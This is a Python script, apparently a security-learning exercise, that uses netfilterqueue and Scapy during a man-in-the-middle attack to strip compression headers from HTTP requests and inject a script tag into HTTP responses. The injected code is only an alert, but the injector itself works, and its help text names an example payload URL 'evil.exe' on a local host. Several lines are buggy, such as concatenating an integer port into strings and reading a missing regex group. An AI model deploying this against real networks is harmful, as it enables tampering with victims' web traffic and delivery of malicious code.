#!/usr/bin/env python

import argparse
import netfilterqueue
import re
import scapy.all as scapy

int_port_http = 80

def do_packet_process(packet):
    ## Referenced from file-interceptor
    obj_packet_scapy = scapy.IP(packet.get_payload())
    if obj_packet_scapy.haslayer(scapy.Raw) and obj_packet_scapy.haslayer(scapy.TCP):
        obj_load = obj_packet_scapy[scapy.Raw].load
        
        ## HTTP Request/Response Criteria
        ## If Source Port (sport) is 42846 (tcp/udp) and Destination Port (dport) is http (80) => Request
        ## If Source Port (sport) is http (80) and Destination Port (dport) is 42846 (tcp/udp) => Response
        ## Check if TCP dport (Destination Port) is HTTP, hence request
        if obj_packet_scapy[scapy.TCP].dport == int_port_http:
            print("💠 Request (Port " + int_port_http + ")")
            
            ## Substitute Header Content using Regex (re) module
            ## Erasing Accept-Encoding: gzip, so the server will not encrypt the Response Raw load
            # print("❗ Erasing Accept-Encoding Property")
            obj_load = re.sub("Accept-Encoding:.*?\\r\\n", "", obj_load)
        
        ## Check if TCP dport (Destination Port) is HTTP, hence response 
        elif obj_packet_scapy[scapy.TCP].sport == int_port_http:
            print("💠 Response (Port " + int_port_http + ")")
            # print(obj_packet_scapy.show())
            
            # print("❗ Injecting an Alert")
            str_code_inject = "<script>alert('test')</script>"
            obj_load = obj_load.replace("</body>", str_code_inject + "</body>")
            str_regex_content_length = re.search("(?:Content-Length:\s)\d*", obj_load)
            ## If a Content-Length value was found and the load is HTML-based
            if str_regex_content_length and "text/html" in obj_load:
                str_content_length = str_regex_content_length.group(1)
                int_content_length_new = int(str_content_length) + len(str_code_inject)
                # print("ℹ️ " + str_content_length)
                # print("ℹ️ " + str(int_content_length_new))
                obj_load = obj_load.replace(str_content_length, str(int_content_length_new))
        
        ## Proceed to Packet/Code Injection if there are discrepancies based on the original payload
        if obj_load != obj_packet_scapy[scapy.Raw].load:
            ## Inject the Payload inside the Packet (Code Injection)
            print("❗ Changes have been found in the Raw content. Setting the payload")
            obj_packet_scapy_new = do_payload_set(obj_packet_scapy, obj_load)
            packet.set_payload(bytes(obj_packet_scapy_new))
    ## Let the Python program allow/block the packets to the target (Only 1 is allowed)
    packet.accept()
    # packet.drop()

def do_payload_set(obj_packet, str_payload):
    # print(packet.show())
    obj_packet[scapy.Raw].load = str_payload
    ## Deleting Checksums and length properties to let network refresh values and bypass checking
    del obj_packet[scapy.IP].chksum
    del obj_packet[scapy.IP].len
    del obj_packet[scapy.TCP].chksum
    return obj_packet

def get_arguments():
    obj_parser = argparse.ArgumentParser(
        prog = 'File Interceptor',
        description = 'Intercepts Payload via MITM.',
        epilog = 'Tested in http://www.speedbit.com/ and Windows Server'
    )
    obj_parser.add_argument("-e", "--extension", dest="ext", help="Extension of the expected payload (E.g. .exe, .rar, .zip)", required=True)
    obj_parser.add_argument("-p", "--payload", dest="payload", help="Payload file Absolute Path (E.g. http://192.168.1.6/evil.exe https://www.7-zip.org/a/7z2301-x64.exe)", required=True)
    options = obj_parser.parse_args()
    return options

## Try-Catch was used to enable keyboard exception handling
try:
    obj_options = get_arguments()
    obj_queue = netfilterqueue.NetfilterQueue()
    ## Bind this object/class to the Terminal iptables Queue
    obj_queue.bind(0, do_packet_process)
    obj_queue.run()
except KeyboardInterrupt:
    print("\n" + "❗ Detected KeyboardInterrupt... Goodbye")
    exit()
